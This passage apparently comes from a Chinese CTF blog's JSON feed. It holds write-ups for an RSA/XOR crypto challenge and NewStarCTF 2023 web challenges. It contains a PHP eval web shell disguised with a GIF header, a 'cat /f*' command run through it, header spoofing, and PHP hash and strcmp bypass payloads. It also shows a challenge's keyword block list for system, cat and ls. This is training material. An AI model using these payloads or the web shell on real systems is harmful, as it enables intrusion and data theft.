进行解密</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>original_string <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>decoded_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    original_char <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>decoded_bytes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    original_string <span class=\"token operator\">+=</span> original_char</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"解密后的原始字符串:\"</span><span class=\"token punctuation\">,</span> original_string<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 flag:</p>\n<p ISEC-52e353a950c752b3dc8f0d1c949f0361=\"\">解密后的原始字符串: flag</p>\n<h2 id=\"这也是rsa密码算法吗\"><a class=\"anchor\" href=\"#这也是rsa密码算法吗\">#</a> 这也是 RSA 密码算法吗？</h2>\n<p>先解压 crypto01.7z，得到摩斯电码，翻译后为 MORSE_CODE_FUNNY，结合文件名将其转换为小写，成功打开压缩包。</p>\n<p>解压出 RSA 的 python 加密文件，发现已知 num1/num2，推测使用连分数攻击，使用 sagemath 脚本解出 num1 和 num2：</p>\n<p>#sage exp</p>\n<p>data3=1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956</p>\n<p>c = continued_fraction(data3)</p>\n<p>print(c)</p>\n<p>alist = c.convergents()</p>\n<p>print(alist)</p>\n<p>for i in alist:</p>\n<p>a = str(i).split('/')</p>\n<p>if len(a)&gt;1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==128 and int(a[1]).bit_length()==128:</p>\n<p>​      print(a)</p>\n<p>#['11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693','9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517']</p>\n<p>已知 leak 可以通过 RSA 算法求出 p-q：</p>\n<p>n1=11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693</p>\n<p>n2=9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517</p>\n<p>phi_n = (n1 - 1) * (n2 - 1)</p>\n<p>d = gmpy2.invert(n1,phi_n)</p>\n<p>print(pow(leak,d,n1*n2))</p>\n<p>现在已知 p-q 和 p*q，联立生成一元二次方程，直接求解出 p，q：</p>\n<p>delta,s = gmpy2.iroot(a<em>a + 4</em>b , 2)</p>\n<p>p = (-1 *a + delta)/2</p>\n<p>q = (-1*a - delta)/2</p>\n<p>之后使用 RSA 解出 pt，减去 num2 即可。</p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/NewStar2023week1-5/",
            "url": "https://p1kap1.github.io/CTF/web/NewStar2023week1-5/",
            "title": "NewStar2023-web-week1~5",
            "date_published": "2023-09-30T16:00:00.000Z",
            "content_html": "<h2 id=\"week1\"><a class=\"anchor\" href=\"#week1\">#</a> Week1</h2>\n<h3 id=\"泄漏的秘密\"><a class=\"anchor\" href=\"#泄漏的秘密\">#</a> 泄漏的秘密</h3>\n<blockquote>\n<p>粗心的网站管理员总会泄漏一些敏感信息在 Web 根目录下</p>\n</blockquote>\n<p>题目说到敏感信息，很容易想到那几个文件，使用 dirsearch 或者其他扫描工具扫一下，发现 robots.txt 和 www.zip 备份文件。</p>\n<p>其中 robots.txt 藏着前半段 flag:</p>\n<blockquote>\n<p>PART ONE: flag{r0bots_1s_s0_us3ful</p>\n</blockquote>\n<p>www.zip 文件藏着后半段：</p>\n<blockquote>\n<p>$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous}&quot;;</p>\n</blockquote>\n<p>拼接即可得到 flag。</p>\n<h3 id=\"begin-of-upload\"><a class=\"anchor\" href=\"#begin-of-upload\">#</a> Begin of Upload</h3>\n<blockquote>\n<p>普通的上传啦，平平淡淡才是真</p>\n</blockquote>\n<p>文件上传题，尝试上传一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>弹出对话框：</p>\n<blockquote>\n<p>错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF</p>\n</blockquote>\n<p>这样的话那就将文件名改为 1.jpg，用 bp 截包，再将文件后缀名修改为 1.php，以此来绕过前端验证。</p>\n<p>或者还有种思路就是用浏览器将该网站的 js 功能给禁用，这样就不会存在前端验证了。</p>\n<p>上传成功得到文件路径：/upload/1.php,</p>\n<p>在 post 框执行</p>\n<blockquote>\n<p>cmd=system(&quot;cat /f*&quot;);</p>\n</blockquote>\n<p>或者用蚁剑连接即可。</p>\n<h3 id=\"begin-of-http\"><a class=\"anchor\" href=\"#begin-of-http\">#</a> Begin of HTTP</h3>\n<blockquote>\n<p>最初的开始</p>\n</blockquote>\n<blockquote>\n<p><strong>Welcome to NewStarCTF 2023~</strong></p>\n<p>欢迎来到 CTF 的世界<br />\n请使用 GET 方式 来给 ctf 参数传入任意值来通过这关</p>\n</blockquote>\n<p>提示用 GET 方式传一个任意值的 ctf 参数</p>\n<blockquote>\n<p>?ctf=1</p>\n</blockquote>\n<p>进入第二层：</p>\n<blockquote>\n<p>很棒，如果我还想让你以 POST 方式来给我传递 secret 参数你又该如何处理呢？ 如果你传入的参数值并不是我想要的 secret，我也不会放你过关的 或许你可以找一找我把 secret 藏在了哪里</p>\n</blockquote>\n<p>让我们猜猜 secret 藏在哪，直接检查源代码，发现：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --></span></pre></td></tr></table></figure><p>解码得到：n3wst4rCTF2023g00000d</p>\n<p>post 传入：</p>\n<blockquote>\n<p>secret=n3wst4rCTF2023g00000d</p>\n</blockquote>\n<p>进入下一层：</p>\n<blockquote>\n<p>很强，现在我需要验证你的 power 是否是 ctfer ，只有 ctfer 可以通过这关</p>\n</blockquote>\n<p>让我们的 power 是 ctfer，一般这种身份认证都藏在 cookie 中。</p>\n<p>修改：</p>\n<blockquote>\n<p>power=ctfer</p>\n</blockquote>\n<blockquote>\n<p>你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023 浏览器 来通过这关！</p>\n</blockquote>\n<p>进入最后一层，修改 User-Agent 为 NewStarCTF2023 即可。</p>\n<p>然后：</p>\n<blockquote>\n<p>希望你是从 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3N0YXJjdGYuY29t\">newstarctf.com</span> 访问到这个关卡的</p>\n</blockquote>\n<p>修改</p>\n<blockquote>\n<p>Referer:newstarctf.com</p>\n</blockquote>\n<p>最后：</p>\n<blockquote>\n<p>最后一关了！只有 本地用户 可以通过这一关</p>\n</blockquote>\n<p>添加 X-Real-IP 头，值为 127.0.0.1</p>\n<blockquote>\n<p>X-Real-IP:127.0.0.1</p>\n</blockquote>\n<blockquote 871e4fd2-8489-4c42-a2a1-5179796d57ce=\"\">\n<p>恭喜你顺利完成了本道题目，这是你的 Flag，快去提交吧：flag</p>\n</blockquote>\n<h3 id=\"errorflask\"><a class=\"anchor\" href=\"#errorflask\">#</a> ErrorFlask</h3>\n<blockquote>\n<p>give me number1 and number2,i will help you to add</p>\n</blockquote>\n<p>提示输入 number1 和 number2，尝试输入数字试试：</p>\n<blockquote>\n<p>?number1=2&amp;number2=3</p>\n</blockquote>\n<p>得到回显：</p>\n<blockquote>\n<p>not ssti,flag in source code~5</p>\n</blockquote>\n<p>提示不是模板注入</p>\n<p>尝试输入其他数据类型：</p>\n<blockquote>\n<p>?number1=2&amp;number2=a</p>\n</blockquote>\n<p>发现报错，在报错目录中发现 flag:</p>\n<p><img data-src=\"../../../images/NewStar/1.png\" alt=\"1\" /></p>\n<h3 id=\"begin-of-php\"><a class=\"anchor\" href=\"#begin-of-php\">#</a> Begin of PHP</h3>\n<blockquote>\n<p>PHP 是世界上最安全的语言，真的吗？</p>\n</blockquote>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 1=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$flag1</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 2=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token variable\">$flag2</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 3=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token variable\">$flag3</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 4=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">2023</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token variable\">$flag4</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 5=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>第一层用数组绕过即可。</p>\n<blockquote>\n<p>?key1[]=1&amp;key2[]=2</p>\n</blockquote>\n<p>由于 md5,sha1 等哈希函数在处理数组类型的传参时，会返回 NULL 值，因此第二层也可以用数组绕过。</p>\n<blockquote>\n<p>key3[]=1</p>\n</blockquote>\n<p>第三层考察 strcmp 函数的特性，如果传入的参数为数组类型，该函数会返回 NULL 值，构造 NULL == 0 来绕过判断。</p>\n<blockquote>\n<p>/?key1[]=1&amp;key2[]=2&amp;key4[]=2</p>\n</blockquote>\n<p>第四层首先要求 key5 不能是数字，同时要比 2023 大，可以在传入的数字后添加字母来绕过判断。</p>\n<blockquote>\n<p>?key1[]=1&amp;key2[]=2&amp;key4[]=2&amp;key5=2024a</p>\n</blockquote>\n<p>最后一层考察 extract 函数导致的变量覆盖，这里的 If 判断只要保证传入变量 flag5 为真即可，在 php 中，除了 0 和 false，任何数据都会被当成 True，不过这里不能传入字母数字。</p>\n<blockquote>\n<p>key3[]=3&amp;flag5=?</p>\n</blockquote>\n<h3 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> R!C!E!</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"c4d038\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这道题要求我们传入的 post 参数 password  ，MD5 加密后的前六位和 'c4d038' 相等。</p>\n<p>写个脚本爆破下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token 